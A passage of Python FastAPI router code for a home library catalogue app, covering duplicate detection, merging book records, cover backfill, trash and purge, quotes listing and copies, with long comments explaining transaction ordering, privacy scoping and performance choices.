                HeadingFacetOut(
                    scheme=row.scheme,
                    number=row.number,
                    label=row.label,
                    book_count=row.book_count,
                )
                for row in headings
            ),
            key=lambda facet: (facet.scheme, facet.number),
        ),
        divisions=sorted(
            (
                DivisionFacetOut(
                    division=row.division,
                    # This library's own word, not Dewey's caption. The schema
                    # field says why at length.
                    label=ddc.DIVISION_TAGS.get(row.division),
                    book_count=row.book_count,
                )
                for row in divisions
            ),
            key=lambda facet: facet.division,
        ),
    )


# ── Duplicates and merging ────────────────────────────────────────────────────
#
# "Is this the same **book**", which is a different question from "is this the
# same **person**" above: these share `authors.author_key` as a normalisation
# and nothing else, and nothing here reads or writes `author_aliases`. They sat
# under the Authors header until the author logic moved to `authorship.py` and
# left the header describing 361 lines it no longer covered.


@router.get("/duplicates", response_model=list[DuplicateGroup])
def list_duplicates(db: DbSession, current_user: CurrentUser) -> list[DuplicateGroup]:
    """Books that look like the same work under different ids.

    Matched on normalised title plus author, NOT on ISBN. An accidental exact
    repeat is already refused by `uq_books_isbn_single_copy`, so the case left
    to catch is the one it cannot see: a hardback and a paperback are the same
    book and two legitimately different ISBNs.

    **A deliberate copy is not a duplicate, and this is where the two are told
    apart.** Two paperbacks of one title are two rows sharing a `copy_group`
    and would otherwise be the strongest match this endpoint can produce: same
    title, same author, same everything. Offering them for merge would invite
    somebody to destroy a book they own, so each group is collapsed to one row
    before the grouping runs. What survives is what the collapse could not
    explain, which is exactly the accidental case.

    Grouping happens in Python rather than SQL because the normalisation
    (casefold, strip punctuation, drop a leading article) is not something
    SQLite can express, and the catalogue is small enough that scanning it is
    cheaper than maintaining a normalised column.
    """
    # Two nested N+1s used to live here, measured at 4002 statements and 5.5
    # seconds over 2000 books, on an endpoint that is unpaginated and backs a
    # UI page. `BookOut.tags` lazy-loaded once per book, and `books_to_out`
    # was called once per group rather than once for the lot.
    books = Shelf.seen_by(db, current_user.id).all(load=Loading.SERIALISED)

    groups: dict[str, list[Book]] = {}
    for book in _one_per_copy_group(books):
        groups.setdefault(_duplicate_key(book), []).append(book)

    duplicated = {key: members for key, members in groups.items() if len(members) > 1}
    if not duplicated:
        return []

    # One serialisation pass for every duplicate, then partitioned back into
    # groups. `books_to_out` costs a constant three statements whatever it is
    # given, so calling it per group is what made it linear in groups.
    flat = [book for members in duplicated.values() for book in members]
    serialised = {out.id: out for out in books_to_out(flat, current_user, db)}

    return [
        DuplicateGroup(key=key, books=[serialised[book.id] for book in members])
        for key, members in sorted(duplicated.items())
    ]


def _one_per_copy_group(books: list[Book]) -> list[Book]:
    """One row per set of deliberate copies, and every ungrouped row as it is.

    The representative is the lowest id in the group, which is stable between
    two reads of the same shelf. Nothing else depends on which one it is: a
    group that survives the collapse alone is dropped from the result, and a
    group that lands beside a genuine duplicate is being offered as a book, not
    as a copy.
    """
    seen: set[str] = set()
    kept: list[Book] = []
    for book in sorted(books, key=lambda row: row.id):
        if book.copy_group is not None:
            if book.copy_group in seen:
                continue
            seen.add(book.copy_group)
        kept.append(book)
    return kept


def _duplicate_key(book: Book) -> str:
    """Normalise a book to something two editions of it will share.

    `importing.identity_key` is the implementation, and it is there rather than
    here because the MARC importer matches on the same key: a title collision
    costs a reading status on the wrong edition here and merges two different
    books there, so one notion of "the same book" has to serve both.
    """
    return identity_key(book.title, book.author)


@router.post("/merge", response_model=BookOut)
def merge_books(
    payload: MergeRequest,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    """Fold several catalogue entries into one.

    The survivor absorbs anything the others have and it lacks: a cover, an
    ISBN, a page count. It never overwrites a value it already holds, on the
    same principle as enrichment, since the kept row is the one a person chose.

    Tags, notes, quotes, loans and reading statuses are repointed rather than
    dropped. A status collision (both rows read by the same person) keeps the
    one on the survivor, because deleting somebody's reading history to
    satisfy a unique index is not an acceptable way to resolve it.
    """
    if payload.keep_id not in payload.book_ids:
        raise HTTPException(status_code=422, detail="keep_id must be one of book_ids")

    books = Shelf.seen_by(db, current_user.id).where(Book.id.in_(payload.book_ids)).all()
    found = {book.id: book for book in books}
    if payload.keep_id not in found:
        raise HTTPException(status_code=404, detail="Book not found")
    if len(found) < 2:
        raise HTTPException(status_code=422, detail="Nothing to merge into that book")

    keeper = found[payload.keep_id]
    losers = [book for book in books if book.id != keeper.id]

    # No further permission check: `visible_to` already yields exactly the set
    # this caller may write. Public books are a shared shelf, and a private
    # book is only visible to the member who added it, so anything that came
    # back from that filter is theirs to merge. See dependencies.book_for_write.

    # The ISBN is unique, so the row it is being taken from has to let go of it
    # first, in its own flush. Doing this after the absorb puts both UPDATEs in
    # one executemany, where the set lands before the clear and trips the index.
    # These rows are about to cease to exist, so releasing it costs nothing.
    absorbed_isbn = next((loser.isbn for loser in losers if loser.isbn), None)
    if keeper.isbn is None and absorbed_isbn is not None:
        for loser in losers:
            loser.isbn = None
        db.flush()

    _absorb_fields(keeper, losers, isbn_override=absorbed_isbn)
    db.flush()

    _repoint_relations(db, keeper, losers)
    db.flush()

    # Read before the loop: `db.expire(loser)` below would make each of these
    # a fresh SELECT, and after the delete there is nothing left to read them
    # from at all.
    shrinking_groups = {loser.copy_group for loser in losers} - {None}

    orphaned_covers: list[int] = []
    adoptions: list[int] = []
    for loser in losers:
        # The keeper may have absorbed the loser's `cover_url`, which names a
        # file about to be deleted with it. Moving the file is what keeps that
        # cover working; everything else the loser held is dead bytes.
        #
        # Decided here, performed after the commit. The URL has to be known now
        # because it goes into the row, and `covers.adoption_url` answers that
        # from the source file's extension without moving anything. Doing the
        # move here as well would put a filesystem write no rollback undoes
        # inside the transaction: a raise between this loop and the commit,
        # which `_normalise_copy_group`'s flush makes reachable, would leave the
        # keeper's row naming a file that had already moved somewhere else.
        if keeper.cover_url == covers.local_url_for(loser.id):
            planned = covers.adoption_url(keeper.id, loser.id)
            keeper.cover_url = planned
            if planned is not None:
                adoptions.append(loser.id)
        orphaned_covers.append(loser.id)

        # Expire before deleting. The repointing above moved rows out from
        # under the loser, but its loaded relationship collections still list
        # them, and the delete cascade walks those collections rather than the
        # database. Without this, every note, quote, loan and status just
        # moved to the keeper is deleted along with the row they came from.
        db.expire(loser)
        db.delete(loser)

    # Merging two rows that were copies of each other is a member saying they
    # were never two objects. That can leave one row wearing a group token,
    # which would keep its ISBN out of the unique index for no reason. Flushed
    # first, or the rows being counted still include the ones just deleted.
    if shrinking_groups:
        db.flush()
        for token in shrinking_groups:
            _normalise_copy_group(token, db)

    db.commit()
    # After the commit, for the reason in `_purge`: a file **moved or unlinked**
    # before it is a loss no rollback undoes. Writing a new one is the other way
    # round on purpose, everywhere in this module; see docs/decisions.md.
    #
    # Adoptions first, and **their outcome decides the sweep**. `adopt` answers
    # None when the move failed, and `uploads.replace_image` is atomic and
    # re-raises having removed only its own temporary file, so on that answer
    # the loser's cover is still sitting under the loser's id. Sweeping it
    # anyway destroys the only copy there is, which for a hand-uploaded cover
    # means destroying it for good: there is no remote source, so the backfill
    # has nothing to re-fetch and cannot repair it.
    kept = {
        from_book_id
        for from_book_id in adoptions
        if covers.adopt(keeper.id, from_book_id) is None
    }
    for book_id in orphaned_covers:
        if book_id not in kept:
            covers.forget(book_id)

    # The row promised a cover the move did not produce, so it is corrected
    # rather than left naming a file nobody wrote. This is what the old
    # pre-commit ordering did with `adopted if adopted else None`, and losing it
    # was the one thing deferring the move made worse rather than better.
    if kept:
        keeper.cover_url = None
        db.commit()

    db.refresh(keeper)
    return book_to_out(keeper, current_user, db)


_MERGEABLE_FIELDS = (
    # `isbn` is absent deliberately: it is unique and handled separately, ahead
    # of everything here. See _absorb_fields.
    #
    # `copy_group` is absent for a different reason, and absorbing it would be
    # a real bug rather than a missed field: it would make the survivor a copy
    # of the loser's siblings, which nobody asked for and which the survivor's
    # own owner never agreed to.
    "subtitle", "author", "publisher", "year", "description", "cover_url",
    "page_count", "language", "categories", "google_books_id",
    "series_name", "series_index", "location",
    # Present for the same reason `location` is: merging two entries for one
    # book, one of them filed, should leave the survivor on that shelf rather
    # than unfiled. It fills a gap and never overrides, so a keeper that is
    # already in a collection stays where its owner put it.
    "collection_id",
    "format", "condition", "lending", "purchase_price_minor", "purchase_currency",
    "purchased_at", "purchase_source",
)


def _absorb_fields(keeper: Book, losers: list[Book], *, isbn_override: str | None = None) -> None:
    """Fill the survivor's gaps from the rows about to disappear.

    `isbn_override` is passed because the losers have already been stripped of
    their ISBN by the time this runs, so the value cannot be read back off
    them. See the ordering note at the call site.
    """
    if keeper.isbn is None and isbn_override is not None:
        keeper.isbn = isbn_override

    for field in _MERGEABLE_FIELDS:
        if getattr(keeper, field) is not None:
            continue
        for loser in losers:
            value = getattr(loser, field)
            if value is not None:
                setattr(keeper, field, value)
                break


def _repoint_relations(db: Session, keeper: Book, losers: list[Book]) -> None:
    loser_ids = [book.id for book in losers]

    # Tags: a set union, since book_tags has no payload beyond the pair.
    existing_tags = {tag.id for tag in keeper.tags}
    for loser in losers:
        for tag in loser.tags:
            if tag.id not in existing_tags:
                keeper.tags.append(tag)
                existing_tags.add(tag.id)
        loser.tags.clear()

    # Classifications move too, and are deduplicated on the way: two rows for
    # one book often carry the same DDC number, and
    # `uq_classifications_book_scheme_number` would refuse the second on the
    # flush. Without this the cascade on the loser's deletion takes them, so a
    # merge would silently drop the provenance of the row that lost.
    #
    # A duplicate is absorbed rather than simply dropped. The keeper may hold
    # `(ddc, 004, NULL)` from K10plus while the loser holds
    # `(ddc, 004, "Informatik")` from the DNB, and deleting that row without
    # taking its caption loses the caption for good: nothing re-enriches a
    # survivor. Same rule as `classifications.add_headings`, a caption where there
    # was none is strictly more than before.
    #
    # **`MAX_CLASSIFICATIONS_PER_BOOK` binds here too, and this is the only
    # other writer that it binds.** `backup.restore` also writes this table and
    # is deliberately uncapped, for the reason given at the constant.
    # A merge takes up to 20 books, so without the count
    # one request moves 8 x 19 = 152 rows onto the survivor, which is then the
    # baseline for the next merge; merge carries no rate limiter, and every
    # listing pays for the result because `books_to_out` selectin-loads this
    # relationship onto every row of every page. An invariant stated "full stop"
    # with one writer exempt from it is worse than a cap that admits it is soft,
    # so this obeys it rather than documenting an exception.
    #
    # The overflow is **deleted**, which is exactly where it was going before
    # this round: the cascade on the loser's deletion took every one of its
    # headings. Keeper first and then losers in id order, so what survives is
    # what was already stored, the same tie-break `classifications.add_headings` uses.
    kept = {
        (ClassificationScheme(entry.scheme), entry.number): entry
        for entry in keeper.classifications
    }
    for heading in (
        db.query(Classification)
        .filter(Classification.book_id.in_(loser_ids))
        .order_by(Classification.id)
        .all()
    ):
        key = (ClassificationScheme(heading.scheme), heading.number)
        survivor = kept.get(key)
        if survivor is not None:
            if survivor.label is None and heading.label is not None:
                survivor.label = heading.label
            db.delete(heading)
            continue
        if len(kept) >= MAX_CLASSIFICATIONS_PER_BOOK:
            logger.info(
                "Book %s is at the classification ceiling; merge drops %r",
                keeper.id,
                heading.number,
            )
            db.delete(heading)
            continue
        heading.book_id = keeper.id
        kept[key] = heading

    # Notes and loans carry their own history and simply move across. Assigned
    # object by object rather than with a bulk UPDATE: a bulk update with
    # synchronize_session=False leaves the session's loaded collections stale,
    # and the delete that follows would cascade straight through them.
    for note in db.query(Note).filter(Note.book_id.in_(loser_ids)).all():
        note.book_id = keeper.id

    # Quotes move with the notes. Without this the cascade on the loser's
    # deletion would take them, and a merge would silently destroy passages
    # somebody typed out by hand. The page numbers travel unchanged and may now
    # describe a different printing, which is the standing cost of merging two
    # rows that were two editions: the alternative is refusing the merge.
    for quote in db.query(Quote).filter(Quote.book_id.in_(loser_ids)).all():
        quote.book_id = keeper.id

    moved = db.query(Loan).filter(Loan.book_id.in_(loser_ids)).all()
    for loan in moved:
        loan.book_id = keeper.id

    # Merging two books that are both lent out used to give the survivor **two
    # open loans**, which the data model says cannot happen: `returned_at IS
    # NULL` is the single active loan. Every later `POST /api/loans` on that
    # book then 409s forever, and the UI renders one `active_loan` so there is
    # no way to see or close the other.
    #
    # The earliest one stays open, because it is the loan that has been out
    # longest and is the one worth chasing. The rest are closed now: the books
    # they described have just become one book, so they are not still out.
    # Built from the objects in hand rather than by re-querying: the
    # repointing above is not flushed yet, so a fresh query does not
    # necessarily see the moved loans as belonging to the survivor.
    on_keeper = db.query(Loan).filter(Loan.book_id == keeper.id).all()
    open_loans = sorted(
        {loan.id: loan for loan in [*on_keeper, *moved]}.values(),
        key=lambda loan: (loan.loaned_at, loan.id),
    )
    still_open = [loan for loan in open_loans if loan.returned_at is None]
    for loan in still_open[1:]:
        loan.returned_at = datetime.now(UTC).replace(tzinfo=None)

    # Progress moves wholesale. It carries no uniqueness of its own, so
    # unlike the statuses below there is nothing to resolve: two members'
    # readings of what turned out to be one book are two histories of one book.
    # Left out, the losers' rows would be cascade-deleted with them, silently
    # throwing away reading history the merge was never asked to touch.
    for entry in db.query(ReadingProgress).filter(
        ReadingProgress.book_id.in_(loser_ids)
    ):
        entry.book_id = keeper.id

    # Every member's reading records, not just the caller's: see
    # `reading.resolve_merge`, which owns why they cannot simply move.
    resolve_merge(db, keeper.id, loser_ids)

    # The library's own fields, for the reason the quotes above move: left out,
    # the cascade on the loser's deletion would take a calibre-web link
    # somebody typed by hand, silently. `custom_fields.resolve_merge` owns the
    # collision rule, which is the keeper's own value winning.
    custom_fields.resolve_merge(db, keeper.id, loser_ids)


# ── Covers ────────────────────────────────────────────────────────────────────

#: Books one backfill run repairs. The run is bounded rather than open ended
#: because it holds an HTTP request open while it fetches: at six at a time and
#: a six second timeout, a hundred books is the most that reliably finishes
#: inside a proxy's read timeout. The response says how many are left, and the
#: caller presses again.
MAX_BACKFILL_BOOKS: Final = 100


@router.post("/covers/backfill", response_model=CoverBackfillOut)
def backfill_covers(
    db: DbSession,
    current_user: CurrentUser,
    after_id: Annotated[
        int,
        Query(
            ge=0,
            # Bounded above as well as below, and the upper bound is not
            # decoration. A Python int has no ceiling and SQLite's does, so
            # without this a bigint passes validation, reaches the driver and
            # raises `OverflowError` from inside the query: a 500 out of the
            # unhandled-exception handler, which classes a bad request as a bug
            # in our own code. Every other numeric query parameter here is
            # bounded at both ends for the same reason.
            le=2**63 - 1,
            description="Carry on past this book id. From the previous reply.",
        ),
    ] = 0,
) -> CoverBackfillOut:
    """Fetch and store the covers of books that are missing one.

    This is what repairs a library that already exists. Storing covers on the
    way in only helps books added afterwards, and the books that need it most
    are the thousands that arrived through a CSV import, which never resolved a
    cover at all.

    **Scoped to the books the caller can see**, like every other query here. An
    admin-only backfill would be worse, not better: `visible_to` has no admin
    bypass, so an admin running it could never repair another member's private
    books, and those books would have no way to be repaired at all. Each member
    repairs their own shelf instead, and the privacy rule is not bent to make an
    operator action work.

    Targets every book with **no cover file behind its id**, which is the set
    that needs one: a book that never had a cover, a book whose `cover_url`
    points at a third party (that is what rots, a file on this volume is not),
    and a book whose column claims a local cover the directory does not have.
    The last case is why this reads the directory rather than the column: they
    can drift, files being the one thing a database row does not carry with it.

    **`after_id` is a cursor, and it is what lets this finish.** Without it the
    batch is the first hundred candidates by id, and a book that cannot be fixed
    stays a candidate, so it sits at the front of every subsequent run for ever.
    Measured across ten ISBNs, only eight resolved to an image, so roughly a
    fifth of any batch is permanently unfixable and accumulates; a pod with no
    egress produces the same shape on the first run. With the cursor each run
    starts past what the last one tried, and `next_after_id` comes back as 0
    once the end is reached, so pressing again starts over and re-tries the ones
    that failed, which may since have become fixable.

    Idempotent either way: a book with a file behind it is never a candidate, so
    a second pass over the same range examines nothing it fixed.
    """
    cover_backfill_limiter.check(current_user.username)

    # One directory read for the whole library, rather than a `stat` per book.
    # A book "has a cover here" when there is a file behind its id, not when its
    # `cover_url` says so: trusting the column is what would let the database
    # and the directory drift apart quietly, and it is also what would stop this
    # being safe to run twice.
    on_disk = covers.stored_ids()
    catalogue = (
        Shelf.seen_by(db, current_user.id).where(Book.id > after_id).all(Book.id.asc())
    )
    candidates = [book for book in catalogue if book.id not in on_disk]
    batch = candidates[:MAX_BACKFILL_BOOKS]

    # Concurrent, because serial would be one round trip per book: a thousand
    # books at even half a second each is eight minutes of waiting. Bounded,
    # because the other end is two free public services and this deployment has
    # one address at them.
    #
    # Only the fetch runs in the pool. The Session is not thread safe, so the
    # assignment happens back here, in one thread. `pool.map` yields results in
    # the order it was given the inputs, which is what makes the positional zip
    # below correct.
    with ThreadPoolExecutor(max_workers=covers.MAX_CONCURRENT_FETCHES) as pool:
        resolved = list(
            pool.map(
                lambda book: covers.resolve_and_store(book.id, book.isbn, book.cover_url),
                batch,
            )
        )

    stored = 0
    unreachable = 0
    still_missing = 0
    for book, url in zip(batch, resolved, strict=True):
        if url is None:
            still_missing += 1
            continue
        if url != book.cover_url:
            book.cover_url = url
        if covers.is_local(url):
            stored += 1
        else:
            # Resolved to a remote URL this server could not download. Counted
            # separately from "no image service has one": with no egress every
            # book lands here, and folding it into either of the other two would
            # report a clean no-op in exactly the situation this exists for.
            unreachable += 1
    db.commit()

    remaining = len(candidates) - len(batch)
    logger.info(
        "Cover backfill for %s: examined %d, stored %d, unreachable %d, "
        "none found for %d, %d left. Totals: %s",
        current_user.username,
        len(batch),
        stored,
        unreachable,
        still_missing,
        remaining,
        covers.outcome_counts(),
    )
    return CoverBackfillOut(
        examined=len(batch),
        stored=stored,
        unreachable=unreachable,
        still_missing=still_missing,
        remaining=remaining,
        # 0 at the end, so the next press starts over rather than answering
        # nothing for ever.
        next_after_id=batch[-1].id if remaining > 0 else 0,
    )


# ── Trash ─────────────────────────────────────────────────────────────────────
#
# Deleting parks a row rather than dropping it. Three things follow from that,
# and each is somewhere a naive soft delete goes wrong.


def _trash(book: Book, db: Session) -> None:
    """Stamp the deletion, and close any loan that was open on it.

    The loan has to go with it. A trashed book leaves the loans list, which is
    deliberate, but the loan row stayed open and `PUT /api/loans/{id}/return`
    404s on a book nobody can see, so the borrower still had it and there was
    no way left to record it coming back. Closing it is the honest end: the
    book has left the catalogue, so the app is no longer tracking who has it.

    **Does not commit.** The caller does, once. Committing here made a bulk
    delete of 500 books 1001 statements and 2.08 seconds, because each commit
    expires the session and forces the next book to be re-selected, and it made
    the operation non-atomic: a crash halfway left half the selection deleted.
    """
    if book.deleted_at is not None:
        return

    now = datetime.now(UTC).replace(tzinfo=None)
    book.deleted_at = now
    for loan in db.query(Loan).filter(
        Loan.book_id == book.id, Loan.returned_at.is_(None)
    ):
        loan.returned_at = now


def _purge(book: Book, db: Session) -> int:
    """Delete a trashed book for good. Returns the id whose cover files the
    caller must forget **after the commit**.

    The cover is the part a soft delete leaves behind, and it is the standing
    cost of holding covers on disk rather than in the row. Files are named by
    book id, so the next book to take that id inherits somebody else's cover,
    and since ids are reused by SQLite after the highest row goes, that is not a
    remote possibility. `_trash` deliberately does **not** do this: a trashed
    book can be restored, and restoring one to a placeholder would be a delete
    that half happened.

    **The unlink is the caller's, and it belongs after the commit.** This
    function used to do it itself, first thing, which made a file loss
    unrecoverable by any failure after it: the transaction rolls the DELETE
    back, so the member still has the book, and its `cover_url` now points at
    a file that no longer exists. Nothing logged it. Adding copies made that
    reachable through the ordinary scan flow, because one ISBN could be held by
    several trashed rows and freeing them could raise part way through. A
    `finally` would not have helped and neither would reordering: only a commit
    settles whether the row is gone, and flushing per book to get closer would
    put back the 3801 statements the "does not commit" note below exists to
    avoid.

    **Does not commit**, for that reason: emptying a trash of 500 books was
    3801 statements and 3.6 seconds of re-selecting.
    """
    book_id = book.id
    token = book.copy_group
    db.delete(book)

    # Only when this row was one of several copies, which almost none are. The
    # flush is what makes the count in `_normalise_copy_group` see the delete,
    # and paying for it on every purge would put those 3801 statements back.
    if token is not None:
        db.flush()
        _normalise_copy_group(token, db)
    return book_id


@router.get("/trash", response_model=Page[BookOut])
def list_trash(
    db: DbSession,
    current_user: CurrentUser,
    paging: Paging,
) -> Page[BookOut]:
    """What this member has deleted and could still put back.

    Declared before `/{book_id}`, like `/export`: FastAPI matches in
    declaration order, so the reverse would make this a request for the book
    with id "trash".

    Most recently deleted first. The trash is read to find something just lost,
    not to browse a history.
    """
    books, total = Shelf.trashed_by(db, current_user.id).page(
        paging.offset,
        paging.limit,
        Book.deleted_at.desc(),
        Book.id.desc(),
        load=Loading.SERIALISED,
    )
    return Page[BookOut](
        items=books_to_out(books, current_user, db),
        total=total,
        page=paging.page,
        page_size=paging.page_size,
    )


@router.get("/quotes", response_model=Page[QuoteWithBookOut])
def list_quotes(
    db: DbSession,
    current_user: CurrentUser,
    paging: Paging,
) -> Page[QuoteWithBookOut]:
    """Every passage the caller may see, from every book.

    Declared before `/{book_id}`, like `/trash` and `/export`: FastAPI matches
    in declaration order, so the reverse would make this a request for the book
    with id "quotes".

    **This is a book query wearing a different hat**, so both halves of it are
    rooted at the shelf and joined outward to `quotes`. Without that a quote
    from somebody else's private book would be listed here with its title and
    cover, which discloses the book, the passage and that the member owns it,
    in one 200. The count is scoped for the same reason: an unfiltered total
    announces how many are hidden.

    The count used to be spelled `count(Book.id)` rather than `count(Quote.id)`
    so that the AST guard could see it was a book query at all. That guard is
    gone and the spelling now carries no such weight, but it is left alone
    because the two are identical over an inner join on a primary key and
    changing it would be a diff with no reader.

    Newest first. A book's own quotes come back in reading order because a book
    has one; a list spanning the shelf does not, and the interesting end of it
    is the one somebody just added.

    Joined to the book rather than fetching one per row: a hundred quotes over
    ninety books is ninety extra statements, which is the N+1 `_books_to_out`
    exists to avoid.
    """
    # `count(Book.id)`, not `count(Quote.id)`. The two are identical here: an
    # inner join, and `Book.id` is a primary key that is never null.
    #
    # The spelling used to be load bearing. `TestEveryBookQueryIsFiltered`
    # recognised a book query by the arguments to `query()`, so `count(Quote.id)`
    # put this statement outside the guard entirely, and dropping its filter was
    # measured to produce no offender. That guard is gone, and both halves below
    # are rooted at the shelf instead, so nothing now depends on which column is
    # counted. Left alone because a count of visible books is what this is.
    shelf = Shelf.seen_by(db, current_user.id)

    total = (
        shelf.select(func.count(Book.id)).join(Quote, Quote.book_id == Book.id).scalar() or 0
    )

    rows = (
        shelf.select(Quote, Book.title, Book.author, Book.cover_url)
        .join(Quote, Quote.book_id == Book.id)
        .options(joinedload(Quote.author))
        .order_by(Quote.created_at.desc(), Quote.id.desc())
        .offset(paging.offset)
        .limit(paging.limit)
        .all()
    )

    return Page[QuoteWithBookOut](
        items=[
            QuoteWithBookOut(
                **QuoteOut.model_validate(quote).model_dump(),
                book_title=title,
                book_author=author,
                book_cover_url=cover_url,
            )
            for quote, title, author, cover_url in rows
        ],
        total=total,
        page=paging.page,
        page_size=paging.page_size,
    )


@router.delete("/trash", response_model=PurgeResult)
def empty_trash(db: DbSession, current_user: CurrentUser) -> PurgeResult:
    """Delete everything in the caller's trash for good.

    Scoped by `in_trash_for`, so emptying the trash never reaches a book the
    caller could not see in it. There is no automatic expiry: this app has no
    scheduler, and a sweep at startup would delete on restart timing rather
    than on any schedule anybody chose.
    """
    books = Shelf.trashed_by(db, current_user.id).all()
    purged = [_purge(book, db) for book in books]
    db.commit()
    # After the commit. See `_purge`: an unlink before it is a file loss no
    # rollback undoes.
    for book_id in purged:
        covers.forget(book_id)
    return PurgeResult(purged=len(purged))


# ── Single book ───────────────────────────────────────────────────────────────


@router.get("/{book_id}", response_model=BookOut)
def get_book(book: BookForRead, db: DbSession, current_user: CurrentUser) -> BookOut:
    return book_to_out(book, current_user, db)


# ── Copies ────────────────────────────────────────────────────────────────────
#
# A library that holds two paperbacks of one title owns two objects, and every
# per-object fact in `books` (location, condition, what was paid, who has it)
# is already written per row. So a copy is a second row, joined to the first by
# a shared `copy_group`.
#
# That token is the whole distinction between a copy and a duplicate. Two rows
# with no group that name the same book are an accident, refused by
# `uq_books_isbn_single_copy` and offered to `/duplicates` to merge. Two rows
# sharing a group are a deliberate statement by somebody who pressed a button
# that said "add another copy", and neither the index nor the duplicate finder
# touches them.

#: Facts about the **work**, which every copy of it shares. Taken from the book
#: being copied rather than accepted from the caller: a payload that can restate
#: them is a payload that can disagree with them, and two rows claiming to be
#: copies of each other while naming different books is a state nothing else in
#: this app knows how to render.
#:
#: `cover_url` is absent and handled separately, because a cover this app holds
#: is a file named by book id: see the note in the handler.
_WORK_FIELDS: Final = (
    "isbn", "title", "subtitle", "author", "publisher", "year", "description",
    "page_count", "language", "categories", "google_books_id",
    "series_name", "series_index",
)


@router.get("/{book_id}/copies", response_model=list[BookOut])
def list_copies(book: BookForRead, db: DbSession, current_user: CurrentUser) -> list[BookOut]:
    """Every copy of this title the caller may see, this one included.

    A one-element list for almost every book in the catalogue, and that is the
    honest answer rather than an empty one: the book in hand is a copy, it is
    just the only one.

    Ordered by id, which is the order they were added. There is no first copy
    in the data model and this does not invent one; it is the order that stays
    the same between two reads.
    """
    if book.copy_group is None:
        return [book_to_out(book, current_user, db)]

    copies = (
        Shelf.seen_by(db, current_user.id)
        .where(Book.copy_group == book.copy_group)
        .all(Book.id.asc(), load=Loading.SERIALISED)
    )
    return books_to_out(copies, current_user, db)


@router.post(
    "/{book_id}/copies", response_model=BookOut, status_code=status.HTTP_201_CREATED
)
def add_copy(
    payload: CopyCreate,
    book: BookForWrite,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    """Record that the library holds another copy of this book.

    The deliberate half of the ISBN collision. Scanning a book already on the
    shelf answers 409 exactly as it always has, because the overwhelmingly
    common reason for it is a second pass through the same bookcase; this
    endpoint is the other reason, and it is reached by pressing something that
    says so rather than by the app guessing.

    **`is_private` is inherited, never chosen here.** A copy of a private book
    that came back public would disclose the book. The caller added the copy,
    so they are its owner and `PATCH /{id}/privacy` can change it afterwards.

    **Reading state is not copied.** Status, rating, progress, notes, quotes
    and loans all belong to a person and an object, and the new object is one
    nobody has read yet. Tags are copied: they describe the work, and
    re-picking six of them for a second paperback is exactly the friction this
    feature exists to remove.
    """
    _checked_collection(db, payload.collection_id)

    if book.copy_group is None:
        book.copy_group = copy_group_token()

    copy = Book(
        **{field: getattr(book, field) for field in _WORK_FIELDS},
        **payload.model_dump(),
        copy_group=book.copy_group,
        is_private=book.is_private,
        added_by_user_id=current_user.id,
        # Somebody adding a copy is holding it, which is the same reason
        # `ownership` defaults to OWNED on a scan.
        ownership=OwnershipStatus.OWNED,
    )
    copy.tags = list(book.tags)
    db.add(copy)
    db.commit()
    db.refresh(copy)

    # After the insert, because a stored cover is a file named by the book's
    # id and the id does not exist until the row does. The file is **copied,
    # not shared**: `covers.forget` deletes by id, so two rows pointing at one
    # file would mean purging either copy blanks the other's cover.
    if covers.is_local(book.cover_url):
        copied = covers.duplicate(copy.id, book.id)
        if copied is not None:
            copy.cover_url = copied
            db.commit()
            db.refresh(copy)
    else:
        # A remote URL, or none at all. Either way this is the same work every
        # other add path does: resolve the best cover available and hold it.
        copy.cover_url = book.cover_url
        if _store_cover(copy):
            db.commit()
            db.refresh(copy)

    return book_to_out(copy, current_user, db)


def _normalise_copy_group(token: str | None, db: Session) -> None:
    """Clear a copy group that has shrunk back to a single row.

    Called after rows are destroyed, never after they are trashed: a trashed
    copy can be restored, and a group cleared underneath it would leave two
    rows that used to be copies of each other with no token and the same ISBN,
    which is precisely what `uq_books_isbn_single_copy` refuses. The restore
    would fail, on a button that has nothing to do with copies.

    Clearing matters because the token is what suspends the unique index for
    that ISBN. A group of one is a book like any other and should be exclusive
    again.

    **Refuses to clear when another ungrouped row already holds the ISBN.**
    Nothing in the app can produce that state (`_create_book` answers 409 on
    any row with the ISBN, grouped or not), but a hand-edited or restored
    database can, and the cost of being wrong is an IntegrityError raised from
    inside somebody's delete.
    """
    if token is None:
        return
    # `whole_table_for_uniqueness`, not a shelf: this is the uniqueness rule,
    # which spans the whole table. A group counted per member would clear a
    # token another member's private copy still needs, and the index does not
    # care who can see a row.
    remaining = whole_table_for_uniqueness(db).filter(Book.copy_group == token).all()
    if len(remaining) != 1:
        return
    survivor = remaining[0]
    if survivor.isbn is not None:
        # Same rule, same reason as above.
        clash = (
            whole_table_for_uniqueness(db, Book.id)
            .filter(
                Book.isbn == survivor.isbn,
                Book.copy_group.is_(None),
                Book.id != survivor.id,
            )
            .first()
        )
        if clash is not None:
            return
    survivor.copy_group = None


@router.patch("/{book_id}/collection", response_model=BookOut)
def set_collection(
    payload: CollectionAssign,
    book: BookForWrite,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    """File this book into a collection, or take it out of one.

    `BookForWrite`, not `BookForOwner`. A collection is shelving, and a public
    book is a shared shelf that any member may curate, exactly like its tags
    and its location. Privacy is the one thing reserved to the owner, and this
    is deliberately not that: filing a book changes nothing about who can see
    it.

    **Per book row, so per copy.** Filing one paperback does not file the
    other, which is the point of two rows: see `models.Book.collection_id`.
    """
    book.collection_id = _checked_collection(db, payload.collection_id)
    db.commit()
    db.refresh(book)
    return book_to_out(book, current_user, db)


@router.patch("/{book_id}/privacy", response_model=BookOut)
def set_privacy(
    payload: PrivacyUpdate,
    book: BookForOwner,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    book.is_private = payload.is_private
    db.commit()
    db.refresh(book)
    return book_to_out(book, current_user, db)


@router.delete("/{book_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_book(book: BookForWrite, db: DbSession) -> None:
    """Move a book to the trash. Reversible with `POST /{id}/restore`.

    The row stays and `deleted_at` is stamped. A delete is one tap away from
    every book, it is the only action here that repeating does not undo, and a
    catalogue is somebody's hours of typing. Reviews of the competition make
    the same complaint about all of them: the app does not say what was
    deleted and offers no way to put it back.

    The status code is unchanged at 204, so nothing calling this has to know.
    """
    _trash(book, db)
    db.commit()


@router.post("/{book_id}/restore", response_model=BookOut)
def restore_book(book: BookInTrash, db: DbSession, current_user: CurrentUser) -> BookOut:
    """Put a trashed book back on the shelf.

    Everything comes back with it: tags, notes, quotes, loans and every
    member's reading status, because none of it ever left. That is the
